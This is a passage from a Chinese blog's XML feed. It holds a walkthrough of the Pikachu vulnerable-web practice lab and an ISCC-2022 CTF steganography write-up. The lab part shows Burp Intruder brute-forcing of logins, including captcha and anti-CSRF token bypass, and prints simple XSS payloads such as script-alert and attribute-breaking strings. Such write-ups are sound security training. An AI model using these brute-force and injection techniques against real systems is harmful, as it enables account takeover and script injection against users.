        <content type="html"><![CDATA[<h1>Burte Force（暴力破解）</h1><h2 id="概述">概述</h2><blockquote><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p><p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p><p>1.是否要求用户设置复杂的密码；<br>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>4.是否采用了双因素认证；<br>…等等。<br>千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!</p><p>你可以通过“BurteForce”对应的测试栏目，来进一步的了解该漏洞。</p><p><strong>从来没有哪个时代的黑客像今天一样热衷于猜解密码 —奥斯特洛夫斯基</strong></p></blockquote><h2 id="基于表单的暴力破解">基于表单的暴力破解</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651757059279-1a4bc411-1d80-4717-99b8-d939e1956545.png" alt="img"></p><ul><li>按题目的要求那就随便输入一个账号密码然后扔进burpsuite里直接爆破</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651757170615-b0e616fb-e98c-43ad-bcaf-a445d001ddba.png" alt="img"></p><ul><li>首先把所有变量标记都删除了，然后只给账号密码的值加</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651757376970-a9effe02-b933-402e-b63f-c904c80de0ca.png" alt="img"></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651757502578-1bea8f73-cbb1-4937-b808-34d54a365336.png" alt="img"></p><ul><li><p>把攻击模式从sniper改成cluster bomb模式</p></li><li><p>然后在payloads里导入字典</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651757898590-6ca9efd1-d28a-432a-98de-e6de0ee8ae98.png" alt="img"></p><ul><li>根据回应的长度改变排序就可以看到有2组密码是能成功登录的。</li></ul><h2 id="验证码绕过（on-server）">验证码绕过（on server）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/23198112/1651757943096-af3ff326-f2b2-4f6f-b2ae-84064d7b0c8e.png" alt="img"></p><ul><li><p>因为多了一个验证码肯定是不能按照上一题的方法直接开搞的，</p></li><li><p>看了一眼tips知道可以直接无视验证码直接开始爆破，那接下来的步骤和<strong>基于表单的暴力破解</strong>的一样</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651759754439-29354125-4406-44bd-b8ca-d5bf4b591fef.png" alt="img"></p><ul><li>直接上结果</li></ul><h2 id="验证码绕过（on-client）">验证码绕过（on client）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/23198112/1651759828167-e2c185f0-ce61-4a33-9571-a7ccf39b367f.png" alt="img"></p><ul><li>这题虽然也有验证码，但是这次是不能忽视了，那就直接看tips</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651823361921-66b6fd33-2519-4d22-9acc-b4adf7394d66.png" alt="img"></p><ul><li>根据tips，F12查看前端JS</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651823524367-49484e26-1f73-4d15-b32f-28051085caa8.png" alt="img"></p><ul><li>定位到了验证码的JS位置，我们尝试删除会不会有影响（既然不能选择无视它，那就让它直接消失）</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651823721685-e24a4468-3df2-4841-938a-548a3beaa42a.png" alt="img"></p><ul><li>然而仅仅删除掉验证码那一块还不行，那我们就干脆连输入验证码的地方也删除了</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651823783817-336233a6-7cb5-49b8-953e-9014d9bdb6b4.png" alt="img"></p><ul><li>都删完之后就会在尝试就会报错，然后验证码又重新出现，既然如此，我们就直接爆破</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651823857454-2c5d2912-1c09-4117-9e34-c36938bd090b.png" alt="img"></p><ul><li>结果如图。</li></ul><h2 id="token放爆破？">token放爆破？</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651824107491-25478033-664d-471b-8dc0-5fe7a0e666a7.png" alt="img"></p><ul><li>尝试直接爆破</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651824125951-925da005-8d63-40d1-b5f6-9ec677b623fe.png" alt="img"></p><ul><li><p>然而并不行，那就要想办法绕过token验证，看其他大佬的博客来操作</p></li><li><p>首先抓包放到爆破模块里按照前面的步骤操作</p></li><li><p>攻击的类型选择Pitchfork</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653111921990-5b88280b-abcc-4a14-9d19-00fead6678ec.png" alt="img"></p><ul><li><p>然后针对token要进行一些其他的处理</p></li><li><p>在Options中找到Grep-Extract把打上勾然后点击Add</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653108514767-6d2374fc-8827-47ae-9155-430b4e8b1710.png" alt="img"></p><ul><li>点击Add跳转到下图，然后点击Refetch response得到页面源码，通过搜索框去找到token的值，点击并复制，后面有用</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653108602860-34ebedb7-f79c-4ae1-9977-635680ef554f.png" alt="img"></p><ul><li>在Intruder的Payloads中设置Payload set为1；type为Runtime file</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653111961883-8a13830f-9b93-4450-bb39-ed4ada8d1618.png" alt="img"></p><ul><li>set 为3；ytpe为Recursive grep；在Initial payload for first request中粘贴前面复制的token值</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653111505190-c624f6e4-6f2c-4937-ac87-012f9019fd0e.png" alt="img"></p><ul><li>然后把线程改成1就可以开始爆破了</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653111798005-498038c3-0b3b-4d3a-8191-ad862383b2b8.png" alt="img"></p><h1>Cross-Site Scripting（XSS 跨站脚本）</h1><h2 id="概述-2">概述</h2><blockquote><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写&quot;CSS&quot;冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>1.反射性XSS;<br>2.存储型XSS;<br>3.DOM型XSS;</p><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p><p>你可以通过“Cross-Site Scripting”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><h2 id="反射型xss（get）">反射型xss（get）</h2><p>根据提示输入kobe</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653112552409-24fae460-5a4c-41c2-88f1-b999da2174ba.png" alt="img"></p><ul><li>那我们直接在输入框输入payload</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>但是会发现输入框做了字数的限制</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653112953963-21d0d12e-a6a2-4bd8-a7e8-1cfc42222a52.png" alt="img"></p><ul><li>直接修改maxlength的值，然后在提交就发现成功了，同时我们也发现url后面有一串字符是和我们的payload很像的，经过查阅发现get类型的xss也可以通过url直接构造传参，但是post不可以</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653113013126-b3fc1000-dcd6-4b08-add6-8cddad3490f9.png" alt="img"></p><h2 id="反射型xss（post）">反射型xss（post）</h2><ul><li>直接传入payload</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653113201839-202a905a-80f6-4803-9a24-3425b6d12663.png" alt="img"></p><h2 id="存储型xss">存储型xss</h2><blockquote><p>持久型XSS（Persistent）又叫做存储XSS（Stored XSS），与非持久型XSS相反，它是指通过提交恶意数据到存储器（比如数据库、文本文件等），Web应用程序输出的时候是从存储器中读出恶意数据输出到页面的一类跨站脚本漏洞（csrf 写 + self-xss = 存储 xss）。 存储型XSS，输出的位置不一定出现在输入的位置，很难依赖于扫描自动发现（请求后从此页面/refer开始爬，看是否能触发）。比如说客户端app输入的位置，可能在app 其他输出地方才会触发，或者需要分享到网页版才能触发。</p></blockquote><ul><li>直接在留言板输入payload并提交，提交后发现就算不输入任何的值也会弹窗</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653113427764-5540dc5f-899c-41be-910c-788e3f12cf7e.png" alt="img"></p><h2 id="DOM型xss">DOM型xss</h2><blockquote><p>DOM-Based XSS是一种基于文档对象模型(Document Object Model,DOM)的Web前端漏洞，简单来说就是JavaScript代码缺陷造成的漏洞。与普通XSS不同的是，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显，这使我们无法通过特征匹配来检测DOM XSS，给自动化漏洞检测带来了挑战。</p></blockquote><ul><li>在输入框中随便输入一个值，然后在源码中找到</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653114558820-bd5348f8-0de4-487c-956c-186776e36a92.png" alt="img"></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653114631770-36d819bd-7495-4934-81a6-a278087de32c.png" alt="img"></p><ul><li>在源码中还发现了这一串代码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">​                    <span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">​                        <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line">​                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">​                    &#125;</span><br><span class="line"></span><br><span class="line">​                    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;G:\MyBlog\blog\source\_posts\%23&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line"></span><br><span class="line">​                    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line"></span><br><span class="line">​                &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这一段JS，是告诉我们用户输入的字符串会被存到str然后拼接，</p><p>根据他提示的payload试试，攻击成功</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653114756057-9aa49bf0-2d1c-4a50-bec3-d968373eb1bc.png" alt="img"></p><h2 id="DOM型xss-x">DOM型xss-x</h2><ul><li><p>这题乍一看和上一题很像</p></li><li><p>随便输入一个字符串然后提交后发现url变了</p></li><li><p>再点击连接，发现url又变了</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653115375628-9a02993f-fe16-4ccf-9031-f376c39f773f.png" alt="img"></p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653115384838-6f5df47f-4f60-48e6-8d1e-458c7761a002.png" alt="img"></p><ul><li>审查源码，发现和上一题类似</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">​                    <span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">​                        <span class="keyword">var</span> str = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>;</span><br><span class="line"></span><br><span class="line">​                        <span class="keyword">var</span> txss = <span class="built_in">decodeURIComponent</span>(str.<span class="title function_">split</span>(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">​                        <span class="keyword">var</span> xss = txss.<span class="title function_">replace</span>(<span class="regexp">/\+/g</span>,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//                        alert(xss);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">​                    &#125;</span><br><span class="line"></span><br><span class="line">​                    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;G:\MyBlog\blog\source\_posts\%23&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line"></span><br><span class="line">​                    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br><span class="line"></span><br><span class="line">​                &lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>直接构造payload：’ onclick=“alert(‘xss’)”&gt;</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653115471618-2a7a13b8-ea61-4e2e-880c-22ab8ff772ae.png" alt="img"></p><ul><li>成功！</li></ul><h2 id="xss之盲打">xss之盲打</h2>]]></content>
      
      
      <categories>
          
          <category> 靶场&amp;靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC-2022</title>
      <link href="/posts/35156/"/>
      <url>/posts/35156/</url>
      
        <content type="html"><![CDATA[<h1>MISC</h1><h2 id="单板小将苏翊鸣">单板小将苏翊鸣</h2><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651480015829-a8a2d7d0-5e24-43f3-b7aa-8ef8edb5cbaf.png" alt="img"></p><p>解压后得到一张图片和压缩包，flag就在压缩包里，但是压缩包被加密了</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651480153861-54c9f339-077a-41f9-8aed-70e5b440e0c6.png" alt="img"></p><p>我们从图片入手，把图片拖入winhex</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651480237780-f6257125-8f9d-44b1-aae6-f964f244fce2.png" alt="img"></p><p>尝试改图片的高度</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651480279249-33493683-e160-4317-852d-762e30ba3023.png" alt="img"></p><p>改变第二行的4到7列的数值就可以改变图片的高度，把01改成06试试</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651480366677-78ccd1d4-17bf-40e2-b23c-cd570f48584f.png" alt="img">得到带有一个二维码的图片扫描后得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u5728\u8fd9\u6b21\u51ac\u5965\u4f1a\u7684\u821e\u53f0\u4e0a\uff0c\u6211\u56fd\u5c0f\u5c06\u82cf\u7fca\u9e23\u65a9\u83b7\u4e00\u91d1\u4e00\u94f6\uff0c\u90a3\u4f60\u77e5\u9053\u6b64\u6b21\u51ac\u5965\u4f1a\u6211\u56fd\u603b\u5171\u83b7\u5f97\u51e0\u679a\u5956\u724c\u5417\uff1f\u53c8\u5206\u522b\u662f\u51e0\u91d1\u51e0\u94f6\u51e0\u94dc\u5462\uff1f  </span><br></pre></td></tr></table></figure><p>利用工具解码得：</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651480474505-6641cc82-a144-419c-98b1-c0a117f211bc.png" alt="img"></p><p>答案是：15942，尝试拿去解压缩包，然后就得到了flag</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1651480539109-51b3055f-c731-4b24-8abc-faf294945c79.png" alt="img"></p><h2 id="降维打击">降维打击</h2><p>下载附件，然后用foremost分离文件</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653028833291-236bb666-e73f-488b-a5c9-a692cdf17242.png" alt="img"></p><p>再使用zsteg分析并分离图片得到：</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653028993893-4c6e4890-88db-43dc-a16b-285907da6fb6.png" alt="img"></p><p>对照《魔女之旅》文字破解就可以得到最终的flag</p><h2 id="藏在星空中的诗-1">藏在星空中的诗-1</h2><p>下载附件打开得到<img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653047721088-30967675-01dc-4180-a236-2f50abb17227.png" alt="img"></p><p>用PS打开psd源文件，发现有两个图层，在只查看图层一的时候，透明度很高，就只能一片白色，那就修改不透明度，直接拉满</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653048009332-4d474e72-21f2-4cbb-bb02-98a0aba9191d.png" alt="img"></p><p>得到下图</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653048129076-a0b6dc21-a5c8-4449-9bfe-35f7db2a3f55.png" alt="img"></p><p>得到顺序13524，再把txt文本里的图案进行排列得</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653048417805-48683e4e-ef14-4cf3-8997-dc5706178fe8.png" alt="img"></p><p>解压压缩包得</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653048374287-cb50d88a-a17e-4148-9312-a278cae764b0.png" alt="img"></p><p>对照表格的符号顺序和txt文本中的顺序就能得到flag</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653048506491-1c49de66-4d62-4eed-aca1-639815621d9d.png" alt="img"></p><h2 id="真相只有一个">真相只有一个</h2><p>下载得到附件】</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653056296912-c68ec279-c64f-4d0d-b278-f26bdd34928c.png" alt="img"></p><p>用winhex打开steam看看</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653056350300-20f3e681-bbc3-4ba6-9054-864d4205158a.png" alt="img"></p><p>前两位都是00后面是03 04，猜想一下是不是zip文件，zip的头文件是504B0304</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653056432813-903428aa-8cd6-4f3f-8a95-684cd19656b0.png" alt="img"></p><p>然后就得到了一个经过加密的压缩包，直接暴力破解就得到了密码</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653056461996-b1a8a783-e4f3-4fca-914b-1a9cf474b0d7.png" alt="img"></p><p>用wires hark打开文件发现一堆的TFTP文件，直接导出</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653057056348-f7f036f0-2e22-4f7c-87b2-ad588e35ab41.png" alt="img"></p><p>MP3的最后是一段摩斯密码</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653057082109-3fcf9b2d-1082-4503-bf20-96e5fe406c72.png" alt="img"></p><p>经过解密得到是</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653057106905-88523301-419a-41e0-8441-5f45e4f5fcef.png" alt="img"></p><p>到这直接提交flag是错的，想想还有一个txt文件没有用到，后来才知道还有一个snow隐写，利用工具解得：</p><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/1653057715130-a54e3966-9e66-4c0c-9f4b-2ab75d0583e7.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
